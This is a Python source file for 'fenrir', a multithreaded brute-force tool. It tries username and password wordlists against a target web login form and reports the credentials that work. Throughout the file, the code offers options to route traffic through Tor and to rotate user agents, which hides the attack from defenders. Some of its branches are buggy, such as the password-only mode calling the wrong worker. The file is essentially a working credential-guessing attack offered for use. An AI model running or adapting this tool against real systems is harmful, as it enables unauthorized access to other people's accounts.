import queue
import sys
import requests
import threading
import itertools
import random

user_agent = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
stop_all_thread = False
users_agents = requests.get("https://raw.githubusercontent.com/HenryVilani/fenrir/main/user_agents.txt").text.split('\n')

found_credentials = {'username':None, 'password':None}


def logo():

    print("""
  █████▒▓█████  ███▄    █  ██▀███   ██▓ ██▀███  
▓██   ▒ ▓█   ▀  ██ ▀█   █ ▓██ ▒ ██▒▓██▒▓██ ▒ ██▒
▒████ ░ ▒███   ▓██  ▀█ ██▒▓██ ░▄█ ▒▒██▒▓██ ░▄█ ▒
░▓█▒  ░ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██▀▀█▄  ░██░▒██▀▀█▄  
░▒█░    ░▒████▒▒██░   ▓██░░██▓ ▒██▒░██░░██▓ ▒██▒
 ▒ ░    ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒▓ ░▒▓░░▓  ░ ▒▓ ░▒▓░
 ░       ░ ░  ░░ ░░   ░ ▒░  ░▒ ░ ▒░ ▒ ░  ░▒ ░ ▒░  [Created by H3nry Vilani]
 ░ ░       ░      ░   ░ ░   ░░   ░  ▒ ░  ░░   ░ 
           ░  ░         ░    ░      ░     ░     
                                                

    """)

def help_message():

    print("Syntax: fenrir.py [--host HOST] [--method METHOD] [-l USERNAME [-L WORDLIST]] [-p PASSWORD [-P WORDLIST]] [--data DATA] [--threads THREADS] [--text-error TEXT] [--satus-error STATUS] [--success-text TEXT] [--success-status STATUS] [--cookies COOKIES] [-v] [--tor] [--random-agent]")

    print("\n")

    print("Options:")
    print("  --host             set host to attack")
    print("  --data             set data from request")
    print("  -l                 set username")
    print("  -L                 set userame wordlist")
    print("  -p                 set password")
    print("  -P                 set password wordlist")
    print("  -v                 use verbose [default: not enable]")
    print("  --tor              use tor connection [default: not enable]")
    print("  --text-error       set text when not successfully logged in")
    print("  --status-error     set status code when not successfully logged in")
    print("  --success-text     set text when success logged")
    print("  --success-text     set status code when success logged")
    print("  --threads          set number of threads [default: 15]")
    print("  --cookies          set specific cookies [default: automatic]")
    print("  --random-agent     use random users agents [default: not enabled]")
    print("  --method           set method to request [default: post]")

    exit()

def configure_options(argv) -> dict:

    options = {'host':'', 'login':'', 'login_wordlist':'', 'password':'', 'password_wordlist':'', 'data':'', 'tor_connection':False, 'text_error':'', 'status_error':'', 'success_text':'', 'success_status':'', 'threads':15, 'cookies':'', 'verbose':False, 'random_user_agents':False, 'method':'POST'}

    index = 0

    while index < len(argv):

        if argv[index] == '--host':

            options['host'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-l':

            options['login'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-L':

            options['login_wordlist'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-p':

            options['password'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-P':

            options['password_wordlist'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--data':

            options['data'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--tor':

            options['tor_connection'] = True

        elif argv[index] == '--text-error':

            options['text_error'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--status-error':

            options['status_error'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--success-text':

            options['success_text'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--success-status':

            options['success_status'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '--threads':

            options['threads'] = int(argv[index+1])

            index+=1
            continue

        elif argv[index] == '--cookies':

            options['cookies'] = argv[index+1]

            index+=1
            continue

        elif argv[index] == '-v':

            options['verbose'] = True
            index+=1
            continue

        elif argv[index] == '--random-agents':

            options['random_user_agents'] = True
            index+=1
            continue

        elif argv[index] == '--method':

            options['method'] = argv[index+1]
            index+=1
            continue

        else:

            index+=1
            continue

    return options

def check_options(options) -> bool:
    '''
        if options['login_wordlist'] != '' and options['password_wordlist'] != '':

            return False
    '''
    if options['data'] == '':

        return False

    elif options['text_error'] == '' and options['status_error'] == '':

        if options['success_text'] == '' and options['success_status'] == '':

            return False

        else:

            return True

    else:

        return True

def read_wordlist(wordlist_file, options, options_index):

    wordlist = queue.Queue()

    with open(wordlist_file, 'r') as file:

        for data in file:

            wordlist.put(data)

    options[options_index] = wordlist

def read_wordlist_itertools(wordlist_file1, wordlist_file2, queueList):

    global stop_all_thread

    words1 = []
    words2 = []

    try:

        with open(wordlist_file1, 'r', errors='ignore') as file:

            for word in file:

                word = word.strip()

                words1.append(word)

        with open(wordlist_file2, 'r', errors='ignore') as file:

            for word in file:

                word = word.strip()

                words2.append(word)

        wordlist = itertools.product(words1, words2)

        for words in wordlist:

            if stop_all_thread == False:
                queueList.put(words)

            else:
                return

    except KeyboardInterrupt:

        stop_all_thread = True
        return

def is_logged(request, options) -> bool:

    if options['text_error'] != '':

        if options['text_error'] in request.text:

            return False

        else:

            return True

    elif options['status_error'] != '':

        if request.status_code == options['status_error']:

            return False

        else:

            return True

    elif options['success_text'] != '':

        if options['success_text'] in request.text:

            return True

        else:

            return False

    elif options['success_status'] != '':

        if request.status_code == options['success_status']:

            return True

        else:

            return False

    else:

        return False

def config_data_to_request(data_string, username, password) -> dict:

    data_dict = {}

    for param in data_string.split('&'):

        param_splited = param.split('=')

        if param_splited[1] == '^USER^':

            data_dict[param_splited[0]] = username

        elif param_splited[1] == '^PASS^':

            data_dict[param_splited[0]] = password

        else:

            data_dict[param_splited[0]] = param_splited[1]

    return data_dict

def config_cookies_to_request(cookies_string) -> dict:

    cookies_dict = {}

    for cookie in cookies_string.split(';'):

        cookies_dict[cookie.split('=')[0]] = cookie.split('=')[1]

    return cookies_dict

def random_user_agent():

    global users_agents

    while True:

        user_agent = random.choice(users_agents)

        if user_agent == '':

            continue

        else:

            return user_agent

def crack_login(options):

    global user_agent
    global is_logged
    global config_data_to_request
    global stop_all_thread
    global found_credentials
    global config_cookies_to_request
    global random_user_agent

    session = requests.Session()

    url = options['host'].split('?')[0]

    session.get(url, headers=user_agent)



    while True:

        if stop_all_thread:

            break

        if type(options['login_wordlist']) != queue.Queue:

            continue

        while not options['login_wordlist'].empty():

            if stop_all_thread:

                break

            

            username = options['login_wordlist'].get().strip()
            password = options['password']

            if options['tor_connection']:

                session.proxies = {"http":"socks5://127.0.0.1:9050", "https":"socks5://127.0.0.1:9050"}

            if options['cookies'] != '':

                cookies = config_cookies_to_request(options['cookies'])

                session.cookies = cookies

            if options['random_user_agents']:

                user_agent['User-Agent'] = random_user_agent()

            data = config_data_to_request(options['data'], username, password)

            login_request = session.request(method=options['method'].upper(), url=options['host'], data=data, headers=user_agent)

            if is_logged(login_request, options):

                found_credentials['username'] = username
                found_credentials['password'] = password

                stop_all_thread = True

                break

            else:

                if options['verbose']:

                    print(f'[-] Trying: [login] {username} --- [password] {password}')
                    options['login_wordlist'].task_done()

                else:

                    options['login_wordlist'].task_done()

    return
        
def crack_password(options):

    global user_agent
    global is_logged
    global config_data_to_request
    global stop_all_thread
    global config_cookies_to_request
    global found_credentials


    while not options['password_wordlist'].empty():

        if stop_all_thread:

            break

        session = requests.Session()

        username = options['login']
        password = options['password_wordlist'].get().strip()

        if options['tor_connection']:

            session.proxies = {"http":"socks5://127.0.0.1:9050", "https":"socks5://127.0.0.1:9050"}

        if options['cookies'] != '':

            cookies = config_cookies_to_request(options['cookies'])

            session.cookies = cookies

        if options['random_user_agents']:

            user_agent['User-Agent'] = random_user_agent()

        data = config_data_to_request(options['data'], username, password)

        login_request = session.request(method=options['method'].upper(), url=options['host'], data=data, headers=user_agent)

        if is_logged(login_request, options):

            found_credentials['username'] = username
            found_credentials['password'] = password

            stop_all_thread = True

            break

        else:

            if options['verbose']:

                print(f'[-] Trying: [login] {username} --- [password] {password}')
                options['password_wordlist'].task_done()

            else:

                options['password_wordlist'].task_done()
    return

def crack_login_password(options, wordlistQueue):

    global user_agent
    global is_logged
    global config_data_to_request
    global stop_all_thread
    global found_credentials
    global config_cookies_to_request

    while True:

        if stop_all_thread:

            break

        while not wordlistQueue.empty():

            if stop_all_thread:

                break

            if found_credentials['username'] != None and found_credentials['password'] != None:

                break

            session = requests.Session()

            username, password = wordlistQueue.get()

            if options['tor_connection']:

                session.proxies = {"http":"socks5://127.0.0.1:9050", "https":"socks5://127.0.0.1:9050"}

            if options['cookies'] != '':

                cookies = config_cookies_to_request(options['cookies'])

                session.cookies = cookies

            if options['random_user_agents']:

                user_agent['User-Agent'] = random_user_agent()

            data = config_data_to_request(options['data'], username, password)

            user_agent['User-Agent'] = random_user_agent()

            login_request = session.request(method=options['method'].upper(), url=options['host'], data=data, headers=user_agent)

            if is_logged(login_request, options):

                found_credentials['username'] = username
                found_credentials['password'] = password

                stop_all_thread = True

                break

            else:

                if options['verbose']:

                    print(f'[-] Trying: [login] {username} --- [password] {password}')
                    wordlistQueue.task_done()

                else:

                    wordlistQueue.task_done()
    

    
    return

def fenrir(options):

    global help_message
    global read_wordlist
    global stop_all_thread
    global found_credentials

    if options['login_wordlist'] != '' and options['password_wordlist'] != '':

        wordlist = queue.Queue()

        thread_working = []

        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_login_password, args=(options, wordlist,)))

        print("[+] Brute Force Started\n")

        for t in thread_working:

            t.start()

        read_wordlist_itertools(options['login_wordlist'], options['password_wordlist'], wordlist)

        try:

            while stop_all_thread == False:

                continue

            if found_credentials['username'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                print(f"[+] Credentials found: [login] {found_credentials['username']} --- [password] {found_credentials['password']}")

        except KeyboardInterrupt:

            exit()

        exit()

    if options['login_wordlist'] != '':

        thread_working = []

        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_login, args=(options,)))

        print("[+] Brute Force Started\n")

        for t in thread_working:

            t.start()
        

        read_wordlist(options['login_wordlist'], options, 'login_wordlist')

        try:

            while stop_all_thread == False:

                continue

            if found_credentials['username'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                print(f"[+] Credentials found: [login] {found_credentials['username']} --- [password] {found_credentials['password']}")

        except KeyboardInterrupt:

            exit()

        exit()

    elif options['password_wordlist'] != '':

        thread_working = []

        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_login, args=(options,)))

        print("[+] Brute Force Started\n")

        for t in thread_working:

            t.start()
        

        read_wordlist(options['password_wordlist'], options, 'password_wordlist')

        try:

            while stop_all_thread == False:

                continue

            if found_credentials['username'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                print(f"[+] Credentials found: [login] {found_credentials['username']} --- [password] {found_credentials['password']}")

        except KeyboardInterrupt:

            exit()

        exit()

    else:

        help_message()



if __name__ == '__main__':

    logo()

    if len(sys.argv) < 5:

        help_message()

    options = configure_options(sys.argv)

    if check_options(options):

        fenrir(options)

    else:

        help_message()
   

